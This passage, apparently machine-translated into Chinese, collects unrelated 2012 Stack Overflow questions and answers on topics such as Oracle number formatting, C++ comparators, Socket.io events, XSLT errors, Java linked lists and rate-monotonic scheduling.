f && /regex2/ { var = $1; f = 0 } 
```

# oracle - Oracle 格式浮点数 11g

> ID：12659319
> 
> 赞同：1
> 
> 时间：2012-09-30T06:56:54.207
> 
> 标签：oracle, casting, floating-point, type-conversion

我要格式化

```
if integer, then integer.00

if float, then float.xx (2 digits of precision) 
```

我有一个除法运算，其值可能会导致整数或浮点数。我想以 2 位精度存储结果。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-30T20:01:14.020

如果它真的只是输出，您可以使用圆形运算符或简单地格式化它。

```
round  ( value/divisor , 2)
to_char( value/divisor ,'99,999,999,990.99') 
```

请备注`0`小数点前。这使得低于 1 的值在前导零的情况下看起来更漂亮。例如。`0.55`而不是`.55`.

[示例 SQL 小提琴](http://sqlfiddle.com/#!4/d4c1b/1)

```
create table test (dividend       number, 
                   divisor        number, 
                   result         number,
                   result_rounded number);

insert into test values (100,10,null,null);
insert into test values (9,5,null,null);
insert into test values (10,15,null,null);

update test set  result         = dividend / divisor
                ,result_rounded = round(dividend/divisor,2); 

select * from test; 
```

结果：

```
 DIVIDEND   DIVISOR     RESULT           RESULT_ROUNDED
    100        10          10               10
    9          5           1.8              1.8
    10         15          0.666666666667   0.67 
```

但是最后，当您尝试输出它时，格式就会起作用，并且四舍五入并没有太大区别。

[示例 SQL 小提琴](http://sqlfiddle.com/#!4/d4c1b/3)

```
select to_char(result,'99,999,999,990.99'),
       to_char(result_rounded,'99,999,999,990.99') 
from test; 
```

结果

```
10.00    10.00
1.80     1.80
0.67     0.67 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:16:32.477

尝试这个

```
SELECT TO_CHAR(1,'99,999,999,999.99') FROM DUAL;  -- THIS GIVES 1.OO

SELECT TO_CHAR(1.3,'99,999,999,999.99') FROM DUAL;  -- THIS GIVES 1.30 
```

重复`99999`仅用于 BILLION 格式。对于成千上万的人来说，它应该是`999,999.99`

# android - Android 从 Intent 获取 vCard 数据

> ID：12659323
> 
> 赞同：5
> 
> 时间：2012-09-30T06:57:16.597
> 
> 标签：android, android-intent, vcf-vcard

我`Intent.ACTION_SEND`用于在我的应用程序中接收数据。如何处理数据类型的发送`text/x-vcard`？

当我使用`intent.getStringExtra(Intent.EXTRA_TEXT)`时，它会引发异常。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-07T18:27:45.160

这对我有用：

```
Uri uri = (Uri) intent.getExtras().get(Intent.EXTRA_STREAM); 
```

`uri.toString()`给了我这个：

```
content://com.android.contacts/contacts/as_multi_vcard/2876r7-2A962A902A9045494F35.1957ifcf79ef7e82a0b99%3A2876r8-315551534945354F312D4F35.1957ieb4f1a6b0fcb82b9%3A2876r9-57493D3135452D3D43.1957ief585d48b64784c0%3A2876r10-4F35373D4343474959.1957if0a70009608fae23%3A2876r11-313B3531412F2D432D473135.1957i39c8fd1b6ef69e84%3A1957i51f47cecc7822f19.4035i611323cd8d55aa13%3A4035i8.4035i74aa09b30a019fa1%3A4035i2c0b359c8a47878e%3A4035i6d3c40138feef64b%3A4035i7d583f5488e47e41%3A4035ia6.4035i5%3A4035i6029e050898a86d3%3A4035i77caf53c89b4da48%3A4035i2a11745a8f3d5667%3A4035i9%3A4035i59ab32fd0fa955a9%3A4035i7391f1908a38ed1b%3A4035i6769848b08a214b0%3A4035i5a7c03c88bd1ba9e%3A4035i126427da8dfc0763%3A4035i35003ea5093abeb0%3A4035i1906758a8e16ca3a%3A4035i59a7953d883a78bf%3A4035i64249c098820452a%3A4035i48145af48ed78ebc%3A4035i2093d7568be9dff6%3A4035i469c62120db59d35.4035i388017020fbfb07e%3A4035i47e19c048aa116d7%3A239i3%3A239i2%3A239i249%3A239i248%3A239i1, 
```

这在这种形式下并不是非常有用，但堆栈上似乎有几篇关于从 URI 获取可用路径的帖子。

要从 vcard 中获取文本，以下内容似乎对我有用：

```
ContentResolver cr = getContentResolver();
InputStream stream = null;
try {
    stream = cr.openInputStream(uri);
} catch (FileNotFoundException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
}

StringBuffer fileContent = new StringBuffer("");
int ch;
try {
    while( (ch = stream.read()) != -1)
      fileContent.append((char)ch);
} catch (IOException e) {
    // TODO Auto-generated catch block
    e.printStackTrace();
}
String data = new String(fileContent);
Log.i("TAG", "data: " + data); 
```

该字符串将有回车符，因此要查看 logcat 中的所有文本，请确保搜索标签（在上面的代码中它是“TAG”），这样您就可以看到所有行（请参见下面的屏幕截图）。

![logcat 截图](../Images/45365e07f88bd676bdd4cbe5a1c58740.png)

# c++ - 非静态函数作为 C++ 中另一个函数的参数

> ID：12659324
> 
> 赞同：1
> 
> 时间：2012-09-30T06:57:22.820
> 
> 标签：c++

我`student`用 subclass做了一个类`comparator`。的构造函数`comparator`接受一个名为的参数`cmp_mode`，该参数指定我们应该如何比较学生。

```
class student
{
public:
    std::string name;
    int course, group;

    student(std::string name,
            int course,
            int group): name(name)
    {
        this->course = course;
        this->group = group;
    }

    enum cmp_mode
    {
        NAME,
        COURSE,
        GROUP
    };

    class comparator
    {
        cmp_mode mode;

    public:
        comparator(cmp_mode mode)
        {
            this->mode = mode;
        }

        bool compare(student s1, student s2)
        {
            if (mode == NAME)
                return s1.name < s2.name;
            else if (mode == COURSE)
                return s1.course < s2.course;
            else if (mode == GROUP)
                return s1.group < s2.group;
            else
                throw "Oh god! We can't compare variables using these keys!";
        }
    };

}; 
```

另外，我创建了一个`list`of `students`，现在我想使用比较器子类对这个列表进行排序。

```
std::list<student> l;

student st1("Anya", 2, 5);
student st2("Misha", 4, 2);
student st3("Yasha", 1, 3);

l.push_back(st1);
l.push_back(st2);
l.push_back(st3); 

student::comparator by_group(student::GROUP);

l.sort(by_group.compare); 
```

但我收到以下错误。

```
ERROR: Reference to non-static member function must be called. 
```

所以我该怎么做？如何以更好的方式调整排序？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-30T10:31:21.177

我从你的评论开始：

> 我以为我可以为每种情况编写比较函数，但似乎更糟。

为什么更糟？我个人认为它运行更快（至少编译更快）并且更容易维护（更短的功能）。

这样写是不是更简单：

```
l.sort(student::compare_by_group); 
```

而且这个实现更容易维护：

```
class student
{
...    
    static bool compare_by_name(const student& s1, const student& s2)
    {
        return s1.name < s2.name;
    }
    static bool compare_by_course(const student& s1, const student& s2)
    {
        return s1.course < s2.course;
    }
    static bool compare_by_group(const student& s1, const student& s2)
    {
        return s1.group < s2.group;
    }

    // Add the followings only if you really need this stuff 
    // e.g. to get comparator type from elsewhere
    enum cmp_mode
    {
        NAME,
        COURSE,
        GROUP
    };

    static bool compare(cmp_mode, const student& s1, const student& s2)
    {
        switch(cmp_mode) {
          case NAME: return compare_by_name(s1, s2);
          ...
        }
    } 

}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T07:10:08.847

非静态成员函数具有该函数所属类型的隐式参数。他们需要这种类型的实例才能工作。您可以使用[`std::bind`](http://en.cppreference.com/w/cpp/utility/functional/bind)（或者[`boost.bind`](http://www.boost.org/doc/libs/1_51_0/libs/bind/bind.html)如果您没有 C++11 支持）将`student::comparator`对象“绑定”到比较函数的第一个参数：

```
student::comparator by_group(student::GROUP);
using namespace std::placeholders;
auto comp = std::bind(student::comparator::compare, &by_group, _1, _2);
l.sort(comp); 
```

在上面的代码中，`by_group`对象被绑定为函数的第一个参数`student::comparator::compare`，生成的函数对象接受两个`student`对象并返回一个`bool`：

```
std::cout << std::boolalpha;
const student& s1 = l[0];
const student& s2 = l[1];
std::cout << comp(s1, s2) << "\n"; // prints "true" or "false". 
```

我还建议您将比较成员函数的签名更改为

```
bool compare(const student& s1, const student& s2) const; 
```

没有理由传值，也没有理由不传成员函数`const`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-30T10:49:43.703

像 Piotr 一样，我建议为每个属性编写比较器，这样更快且不易出错。但是，我建议使用仿函数对象而不是静态函数：

```
struct compare_by_name {
  bool operator()(const student& a, const student& b) const {
    return a.name < b.name;
  }
}; 
```

如果您只需要一次或两次比较器并且您使用的是 C++11，则更喜欢内联 lambda：

```
l.sort([](const student& a, const student& b){ return a.name < b.name; }); 
```

如果您绝对需要动态比较器，请将其编写为普通函子对象，即定义一个`operator()`：

```
bool operator()(const student& a, const student& b) const {
  switch (mode) {
    case NAME:
      return a.name < b.name;
    // No default case, the constructor (if at all) should check whether the mode
    // is valid.
  }
} 
```

# objective-c - FBNativeDialogNotSupported Facebook sdk 3.1

> ID：12659327
> 
> 赞同：0
> 
> 时间：2012-09-30T06:58:05.613
> 
> 标签：objective-c, ios, facebook-graph-api, facebook-ios-sdk

随着 Facebook SDK 3.1 的发布，它有一个类可以在 iOS 6 中启动 Facebook Native Dialog for Post。

下面是它的代码。

```
[FBNativeDialogs presentShareDialogModallyFrom:currentController initialText:nil image:nil url:nil handler:^(FBNativeDialogResult result, NSError *error) {
 //Print Error
                    }]; 
```

错误域=com.facebook.sdk 代码=7“操作无法完成。（com.facebook.sdk 错误 7。）”UserInfo=0x1e5e0930 {com.facebook.sdk:NativeDialogReasonKey=com.facebook.sdk:NativeDialogNotSupported

因此，我尝试先使用以下代码登录，然后启动 FBNativeDialog。***但是，当在 Safari 中按下 Facebook 权限窗口的Okay***按钮时，它不会进入完成处理程序。

```
AppDelegate *appDelegate=[[UIApplication sharedApplication] delegate];
appDelegate.session = [[FBSession alloc] initWithPermissions:[NSArray arrayWithObjects:@"publish_stream", nil]];

                    [appDelegate.session openWithCompletionHandler:^(FBSession *session, FBSessionState status, NSError *error) {
                        switch (status) {
                            case FBSessionStateOpen:
                            [FBNativeDialogs presentShareDialogModallyFrom:currentController initialText:nil image:nil url:nil handler:^(FBNativeDialogResult result, NSError *error) {
                        NSLog(@"Dialog Error= %@",error);
                    }];
                                break;

                            default:
                                break;
                        }
                    }]; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T21:30:28.373

> 当在 Safari 中按下 Facebook 权限窗口的确定按钮时

您需要在 iOS 6 设备/模拟器上设置 Facebook 帐户才能使用本机共享对话框。完成此操作后，您还将获得本机 iOS 权限对话框，因此不应有应用程序切换到 Safari 登录。[请参阅我对http://facebook.stackoverflow.com/a/12681352/1712979](http://facebook.stackoverflow.com/a/12681352/1712979)的类似回复

# javascript - Socket.io 不触发从客户端到服务器的事件

> ID：12659330
> 
> 赞同：4
> 
> 时间：2012-09-30T06:58:49.093
> 
> 标签：javascript, node.js, express, websocket, socket.io

为什么我的服务器不响应客户端发出的事件？我从 socket.io 网页上尝试了一些简单的例子，它们似乎工作正常。

我的目标是每当用户从输入框中聚焦时发出一个事件，比较服务器上的输入值，然后将一个事件返回给客户端。

**客户端**

```
$('#userEmail').focusout(function() {
  var value = $('#userEmail').val(); // gets email from the input field
  console.log(value); // prints to console (it works!)
  socket.emit('emailFocusOut', { userEmail: value }); // server doesn't respond to this
}); 
```

**服务器端**

```
io.sockets.on 'emailFocusOut', (data) ->
  console.log(data) 
```

**附加信息**

*   快递3.0rc4
*   套接字.io 0.9.10
*   咖啡脚本 1.3.3

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-30T10:44:07.003

您必须将自定义事件放在`io.sockets.on`函数中。以下代码将起作用：

```
io.sockets.on('connection', function (socket) {  
  socket.on("emailFocusOut", function(data) {
    console.log(data) // results in: { userEmail: 'awesome' }
  })
}); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-30T10:30:59.437

如果您需要来自服务器的一些答案，您的服务器应该**将**消息发送回客户端。
`console.log`不做网络接听。

```
var io = require('socket.io').listen(80);

io.sockets.on('connection', function(socket) {
    socket.on('emailFocusOut', function(data) {
        data.receivedAt = Date.now();
        socket.emit('emailFocusOutResponse', data); // answer back
    });
}); 
```

然后在客户端上，您可以收听`'emailFocusOutResponse'`并处理此消息。

# php - 如何从帖子中提取标签图像？

> ID：12659332
> 
> 赞同：2
> 
> 时间：2012-09-30T06:58:55.083
> 
> 标签：php, wordpress

我有响应式模板，效果很好。

我想将其转换为主题 wordpress。

在模板里面有画廊包含图像和描述和标题链接。

*   由于画廊在模板中构建并且一切（响应式）都运行良好。
*   我想将画廊嵌入/转换为主题作为帖子，添加链接
*   Gallery.js 并生成模板中显示的标记 html。

**模板的源代码：**

```
<!--orginal---------->
                <div class="main">
                    <div id="carousel" class="es-carousel-wrapper">
                        <div class="es-carousel">
                            <ul>
                                <li>
                                    <div class="box-1">
                                        <img src="images/page1-img1.jpg" alt="" /> <a href="#">bora-bora</a>
 <span>from $458</span> 
                                        <p>Praesent vestibulum aenean
                                            <br>nonummy hendrerit mauris.</p>
                                    </div>
                                </li>
                            </ul>   
                        </div>      
                    </div>
                </div> 
```

**我只需要生成：**

```
<img src="images/page1-img1.jpg" alt="" /> <a href="#">bora-bora</a>
 <span>from $458</span> 
                                        <p>Praesent vestibulum aenean
                                            <br>nonummy hendrerit mauris.</p> 
```

![在此处输入图像描述](../Images/805ee3807d89013661465c5c1a092910.png)

我创建新帖子。

*   在我写的标题中：BORA-BORA
*   在内容帖子中，我添加了来自媒体的图像
*   在图像下，我添加了描述图像“Praesent vestibulum aenean nonummy hendrerit mauris。”。
*   在我写的 Excper 中：458 美元起

在此之后，我添加了生成 html 标签库的代码，如下所示：

```
 <div class="main">
        <div id="carousel" class="es-carousel-wrapper">
            <div class="es-carousel"><ul>

                    <?php $hot_deals = new WP_Query('showposts=2&category_name=hot_deals'); ?>
<?php if($hot_deals->have_posts()) : ?>
<?php while($hot_deals->have_posts()) : $hot_deals->the_post(); ?>
        <li>
            <div class="box-1">
                    <?php the_content(); ?><a href="#"><?php the_title(); ?></a>
                    <span><?php the_excerpt(); ?></span>
            </div>          
        </li>

<?php endwhile; ?>
<?php endif; ?>         
            </ul></div> 
        </div>  
    </div> 
```

结果很接近，但因为我需要它不起作用：

1.  从中`<img />`提取`<p><a><img /></p></a>`。

2.  `<p>`从中取出`<span><p>FROM $458</p></span>`。

非常感谢 我该怎么做？

```
<div class="main">
    <div id="carousel" class="es-carousel-wrapper">
        <div class="es-carousel"><ul>
            <li>
                <div class="box-1">
                    <p><a href="http://127.0.0.1/www/www1/wordpress/wordpressEng/wp-content/uploads/2012/09/page1-img2.jpg">
                       <img class="alignnone size-full wp-image-82" title="page1-img2" src="http://127.0.0.1/www/www1/wordpress/wordpressEng/wp-content/uploads/2012/09/page1-img2.jpg" alt="" width="219" height="124" />
                       </a>
                    </p>
                    <p>Praesent vestibulum aenean<br />
                    nonummy hendrerit mauris.</p>
                    <a href="#">bora-bora</a>
                    <span><p>FROM $458</p></span>
                </div>          
            </li>
        </div>      
    </div>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T08:29:10.417

您没有提取，因为您只是在显示`the_content()`. 您可以在不更改主题的情况下做到这一点的唯一方法是您只需转到您正在编辑帖子内容的 HTML 选项卡并删除`<a></a>`标签。

但是，如果您可以/想要编辑主题，您可以添加一个带有图像上传字段的自定义元框，然后将图像上传到那里而不是内容中。这样你就可以完全控制它。

# xml - XSL 错误：xsl:template 元素不得包含 xsl:template 元素

> ID：12659340
> 
> 赞同：0
> 
> 时间：2012-09-30T07:00:25.483
> 
> 标签：xml, xslt

执行xsl后，报错：

> 因为： xsl:template 元素不得包含 xsl:template 元素；SystemID: 文件:/C:/xslt/CombineToOutput.xsl; 第 19 行；Column#: -1 元素只能在样式表的顶层使用；SystemID: 文件:/C:/xslt/CombineToOutput.xsl; 第 19 行；Column#: -1（编译样式表失败。检测到 2 个错误。）（编译样式表失败。检测到 2 个错误。）

XSLT

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns="http://www.openapplications.org/oagis/9">

    <!--  STICKER INFO COMBINETOOUTPUT-->
    <xsl:template match="/">
        <xsl:apply-templates select="child::node()/*[name()!='DbResponse']"/>       
    </xsl:template>

    <xsl:template match="node()|@*">
        <xsl:copy>
            <xsl:apply-templates select="node()|@*"/>
        </xsl:copy>
    </xsl:template>

    <xsl:template match="*:PurchaseOrder">
        <xsl:apply-templates select="*:PurchaseOrderLine/Item/CustomerItemID/ID"/>

        <xsl:template match="*:PurchaseOrderLine/Item/CustomerItemID/ID">
            <xsl:variable name="ArtNr" select="/*/ProcessPurchaseOrder/DataArea/PurchaseOrder/PurchaseOrderLine/Item/CustomerItemID/ID"/>
            <xsl:variable name="WepNr" select="/*/DbResponse/ResultSet/Row[Cell[@name='ARTNR']=$ArtNr]/Cell[@name='WEPNR']"/>
            <xsl:copy>
                <xsl:if test="$WepNr!=''">
                    <LineNumber><xsl:value-of select="$WepNr"/></LineNumber>
                </xsl:if>
                <xsl:apply-templates select="@*|node()"/>
            </xsl:copy>
        </xsl:template>
    </xsl:template>

</xsl:stylesheet> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T08:19:06.787

错误信息很清楚。

```
<xsl:template match="*:PurchaseOrder"> 
```

包含

```
 <xsl:template match="*:PurchaseOrderLine/Item/CustomerItemID/ID"> 
```

这在 XSLT 中是不允许的。只需移动内部模板，使其不再包含在外部模板中。

# jquery - 如何在 asp.net 2.0 中绘制图形

> ID：12659347
> 
> 赞同：0
> 
> 时间：2012-09-30T07:01:20.310
> 
> 标签：jquery, asp.net

我想在 .net 2.0 中开发的 Web 应用程序中表示图形分析。我推荐了一些 jquery 插件，但没有找到合适的。

如果你看过的话，我想呈现一个类似于堆栈溢出的信誉部分的图表。请帮助找到这样的图形插件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T07:12:18.137

从我的想法来看，至少有 4 种制作图表的方法。

1.  使用**纯 CSS**和 div
2.  使用构建图形的**javascript**
3.  使用**Flash**或**Silverlight**
4.  使用后面的代码在图像上**绘制图形**。

从您要求的所有内容中，您都需要一个看起来像 SO 的东西，所以这**就是 css 方式**。

在该页面上查看一些示例和代码：

[http://www.hongkiat.com/blog/data-visualization-with-css-graphs-charts-and-more/](http://www.hongkiat.com/blog/data-visualization-with-css-graphs-charts-and-more/)
[http://acrisdesign.com/2009/09/20-tutorials-on-css-graph- and-charts/](http://acrisdesign.com/2009/09/20-tutorials-on-css-graph-and-charts/)
[http://designmodo.com/css-graph-chart-tutorials/](http://designmodo.com/css-graph-chart-tutorials/)

但您也可以搜索“使用 css 制作图形”

实际上，您在这里所做的，是使用用 css 格式化的 Div，使它们看起来像条形图。然后在后面的代码上，您只需要在渲染此图时提供正确的参数。

一般来说，每个领域都有太多的例子，很多准备使用的代码或库，所以我专注于你要求的，css方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:09:06.380

那么你可以找到很多jquery graph

[1.jqplot](http://www.jqplot.com/)

[2.jquery可视化](http://www.filamentgroup.com/lab/jquery_visualize_plugin_accessible_charts_graphs_from_tables_html5_canvas/)

[3\. 高图](http://www.highcharts.com/)

[4.jQuery迷你图](http://www.omnipotent.net/jquery.sparkline/)

[5\. 漂浮](http://code.google.com/p/flot/)

就个人而言，我使用`jqplot`ASP.NET MVC3 并`jqplot`做得很好。

对于 .net 2.0，您可以访问以下链接：

[http://www.nilzorblog.com/2010/01/using-microsoft-chart-controls-in-net.html](http://www.nilzorblog.com/2010/01/using-microsoft-chart-controls-in-net.html)

[http://www.chartingcontrol.net/](http://www.chartingcontrol.net/)

[阅读 MSDN 论坛](http://social.msdn.microsoft.com/forums/en-US/sqlreportingservices/thread/31b16ff8-f61f-457d-ad45-4f557cdb1381/)

[http://quickgraph.codeplex.com/](http://quickgraph.codeplex.com/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T07:10:17.470

你可以使用这个库，它非常有用，也许可以帮助你：

[http://g.raphaeljs.com/](http://g.raphaeljs.com/)

# javascript - 如何从 Node.js 中的 JSON 输出中修剪空格？

> ID：12659350
> 
> 赞同：2
> 
> 时间：2012-09-30T07:02:05.910
> 
> 标签：javascript, json, node.js, express

在使用 Express 的 Node.js 上，我使用简单`response.send(myObject)`的输出 JSON 它工作正常，但响应中有很多空格缩进。删除它们会将大小减小一半。有没有快速/正确的方法来做到这一点？我尝试使用`JSON.stringify`并且效果很好，但这会将响应类型转换为`text/html`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T07:23:29.617

在 3.0.0alpha1 中引入了一个配置设置

试试 app.set('json 空间',0)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:05:00.593

您还可以压缩您的输出，这将通过 gzip 来删除不必要的空格。

```
 app.use(express.compress()); 
```

# node.js - nodejs - 将 appjs 控制台传送到文件

> ID：12659353
> 
> 赞同：1
> 
> 时间：2012-09-30T07:02:21.057
> 
> 标签：node.js, logging, stream, pipe, appjs

我尝试使用以下代码将 appjs 控制台通过管道传输到文件：

```
var fs = require('fs');
var logStream = fs.createWriteStream(__dirname+ '/log.txt', { flags: 'a' });
process.stdout.pipe(logStream);
process.stderr.pipe(logStream);
console.log("test"); 
```

它会创建一个空文件，但仅此而已……使用 node.exe，“测试”进入控制台，而不是日志文件。该平台是win32，但我认为它不重要。

代码有什么问题？

**结论：**

标准输出、标准错误和文件写入流都是接收器类型的端点，所以我不能将它们绑定在一起。我需要用双工模拟流替换标准输出和标准错误，这样我就可以将这些模拟流绑定到原始接收器和日志接收器。我不确定console.log 和console.error 是否会受到用supernova 建议的机制替换流的影响，我宁愿使用专用的记录器，它使用控制台而不是这种解决方法。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-30T07:34:31.030

您必须为 process.stdin、process.stdout 和 process.stderr 定义 getter

```
var fs = require("fs")
  , errlog = fs.createWriteStream("./err.log", { flags: 'a' })

process.__defineGetter__("stderr", function(){
  return errlog 
})

process.stderr.write("test") 
```

这应该工作

# java - java链表

> ID：12659355
> 
> 赞同：0
> 
> 时间：2012-09-30T07:02:29.173
> 
> 标签：java, list, linked-list

我正在处理一个链表问题，这是我的代码的问题，我遇到了三个错误，请帮忙。

编写一个名为“odd”的函数，它接受一个链表并返回奇数元素。实际上，编写两个函数，分别称为“奇数”和“偶数”。odd(L) 返回 L 中第 1、3、5... 项的列表。 even(L) 返回 L 中第 2、4、6... 项的列表。每个函数调用另一个。这两个功能是基于一个简单的观察。L.next 类似于 L，但缺少第一项。如果我们去掉第一个项目，项目 N+1 就变成了项目 N。所以 L 的第 2、3、4 个元素是 L.next 的第 1、2、3 个元素。现在如果 N+1 是奇数，N 是偶数，而如果 N+1 是偶数，N 是奇数。所以 L.next 的奇数成员是 L 的偶数成员，L.next 的偶数成员是 L 的奇数成员。然后我们可以计算奇数（L）如下。如果 L 为 null，则返回 null。否则返回第一项为 L.item 的列表，而它的尾巴是偶数（L.next）。计算偶数（L）：如果 L 为 null，则返回 null。否则返回奇数（L.next）。您的 main 函数应该从命令行读取一个正整数列表，并以 -1 终止该列表。它应该形成一个包含这些整数的链表，计算奇数成员的列表，并打印它们。

我的代码：

```
public class linkedlist
{
public static void main(String[] args) 
{

  List odd = new ArrayList();
  List even = new ArrayList();
  odd(L, odd, even);
}
void odd(L curNode, ArrayList oddList, ArrayList evenList) 
{

   if (curNode == null) return;

   oddList.append(curNode.val);
   even(curNode, oddList, evenList);
}

void even(L curNode, ArrayList oddList, ArrayList evenList) 
{
   if (curNode == null || curNode.next == null) return;

   evenList.append(curNode.n ext.val);
   odd(curNode.next.next, oddList, evenList);
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-30T08:54:23.970

我相信这有一个非常简单的解决方案。

您必须从列表的第一个元素开始，将其放入`odd`列表中，然后放在`even`.

所以你所要做的就是这个，

1.  从列表的头部开始，给`odd`函数。
2.  在`odd`函数中将其存储在列表中并使用其下一个`odd`调用该函数。`even`
3.  在`even`函数中将其存储在列表中并使用其下一个`even`调用该函数。`odd`
4.  继续这些步骤，直到达到 null。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-01T21:44:32.940

这可能有效：

```
import java.util.LinkedList;
import java.util.Arrays;
import java.util.Scanner;

public class linked_list {

    public static void main(String args[])
    {
        linked_list theApp = new linked_list();
        theApp.run();
    }

    public void run()
    {

        LinkedList<Object> theList = getListFromUser();
        System.out.println( theList );
        LinkedList<Object> oddList = odd(theList);
        System.out.println(oddList);
    }

    LinkedList<Object> even(LinkedList<Object> theList)
    {
        if (theList == null || theList.size() == 0 )
        {
            return null;
        }
        Integer a = (Integer) theList.removeFirst();
        return odd(theList);
    }

    LinkedList<Object> odd(LinkedList<Object> theList)
    {
        if (theList == null || theList.size() == 0 )
        {
            return null;
        }
        LinkedList<Object> temp = new LinkedList<Object>();
        Integer value = (Integer) theList.removeFirst();
        LinkedList<Object> temp2 = even(theList);
        if ( temp2 != null )
        {
           temp.addAll( temp2 );
        }
        temp.add(value);
        return temp;
    }

    LinkedList<Object> getListFromUser()
    {
        LinkedList<Object> temp = new LinkedList<Object>();
        Scanner user_input = new Scanner( System.in );
        int value = 0;
        System.out.println("Enter some integers for a list");
        System.out.println("Enter -1 when done");
        String integer;
        while (value != -1)
        {
            System.out.println("Enter integer:");
            integer = user_input.next();
            value = Integer.parseInt(integer);
            if ( value != -1 )
            {
                temp.add( new Integer(value));
            }
        }
        return temp;
    }

} 
```

跑：

```
Enter some integers for a list
Enter -1 when done
Enter integer:
1
Enter integer:
2
Enter integer:
3
Enter integer:
4
Enter integer:
5
Enter integer:
6
Enter integer:
7
Enter integer:
8
Enter integer:
9
Enter integer:
10
Enter integer:
-1
[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
[9, 7, 5, 3, 1] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T16:07:41.010

您有语法错误。试试这个代码：

```
public class OddEven {
  public List even(List L) {
    List toReturn = new ArrayList();

    //replace this line with code that takes all even
    toReturn.add(L.get(0));

    return toReturn;
  }

  public static void main(String []args) {
    OddEven o = new OddEven();
    List input = Arrays.asList(1,2,3,4,5);

    List even = o.even(input);

    System.out.println(even);
  }
} 
```

# c# - Windows 服务无法在某些本地系统上启动

> ID：12659356
> 
> 赞同：0
> 
> 时间：2012-09-30T07:02:38.307
> 
> 标签：c#, windows-services, network-programming

我创建了一个 Windows 服务并将其安装在网络中的 3 台计算机上。

其中两个工作正常，但第三个有问题。

我已经使用事件日志来找出问题所在，但是它只是在我第一次重新启动系统时插入日志，而且我发现它只是`InitializeComponent()`在其构造函数中执行命令。

**注意：**我的服务应该插入网络中所有帐户的登录和注销，并且在我的服务启动之前需要它们成功启动的 3 个依赖项。

**编辑：** 我按照这篇文章创建了我的服务。以下代码只是服务的构造函数。

```
ComAdminCatalogClass comAdmin = new ComAdminCatalogClass();
ICatalogCollection subCollection;

//Service Constructor
Public Service1()
{
   try
   {
      EventLog.WriteEntry("Service1","1");
      InitializeComponent();
      EventLog.WriteEntry("Service1","2");

      subCollection = (ICatalogCollection)comAdmin.GetCollection("TransientSubscriptions");

      SubScribToEvent(subCollection, "Logon");
      SubScribToEvent(subCollection, "Logoff");
   }
   catch (Exception exp)
   {
      EventLog.WriteEntry("Service1",exp.Message);
   }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T07:40:23.247

非常感谢@akton，我通过运行我的服务的exe找到了解决方案！

太傻了。第三系统的事件查看器已经满了！！！我从中清除了所有日志，我的服务现在在所有三个系统中都可以正常工作。

您可以按照[以下步骤](http://www.fanhow.com/knowhow%3aClear_Events_in_Windows_XP_31771266)清除所有事件

# algorithm - 调度：隐式期限率单调算法的提前期限

> ID：12659359
> 
> 赞同：0
> 
> 时间：2012-09-30T07:03:36.947
> 
> 标签：algorithm, scheduling

给定一组任务：

```
T1(20,100) T2(30,250) T3(100,400) (execution time, deadline=peroid) 
```

现在我想限制最后期限，因为第 i 个任务的新期限在`Di = f * Pi`哪里，是第 i 个任务的原始期限，并且是我想弄清楚的因素。使用速率单调调度程序，任务将继续满足其最后期限的最小值是多少？`Di``Pi``f``f`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T10:42:34.060

此模式将每 2000 个时间单位重复（同步）一次。在这段时期

*   T1 必须运行 20 次，需要 400 个时间单位。
*   T2 必须运行 8 次，需要 240 个时间单位。
*   T3 必须运行 5 次，需要 500 个时间单位。

总计为每 2000 个时间单位间隔 1140 个时间单位。

```
f = 1140 / 2000 = 0.57 
```

这假设长时间运行的任务可以被中断和恢复，以允许较短运行的任务在两者之间运行。否则，一旦 T3 开始，T1 将无法按时完成。

更新的截止日期是：

```
T1(20,57)
T2(30,142.5)
T3(100,228) 
```

这些将每 1851930 个时间单位重复一次，并且需要相同的时间来完成。

* * *

一个小的简化：在计算因子时，周期时间抵消了。这意味着您实际上不需要计算周期来获取因子：

```
Period = 2000
Required time = (Period / 100) * 20 + (Period / 250) * 30 + (Period / 400) * 100
f = Required time / Period = 20 / 100 + 30 / 250 + 100 / 400 = 0.57

f = Sum(Duration[i] / Period[i]) 
```

* * *

要计算周期，您可以这样做：

```
Period(T1,T2) = lcm(100, 250) = 500
Period(T1,T2,T3) = lcm(500, 400) = 2000 
```

哪里`lcm(x,y)`是[最小公倍数](http://en.wikipedia.org/wiki/Least_common_multiple "WP：最小公倍数")。

# nginx - 上传大于 15MB 的较大文件时，nginx 出现内部服务器错误

> ID：12659369
> 
> 赞同：0
> 
> 时间：2012-09-30T07:04:47.260
> 
> 标签：nginx, reverse-proxy

我正在使用并行 plesk 11，并且有 nginx 服务作为反向代理服务器，我正在使用它，每当我尝试上传大于 15MB 的文件时，它都会出现内部服务器错误。我无法找出导致此问题的问题。我正在提供 php.ini 设置。检查后请告诉我任何解决方案，非常迫切地知道它正在影响我的服务器服务。

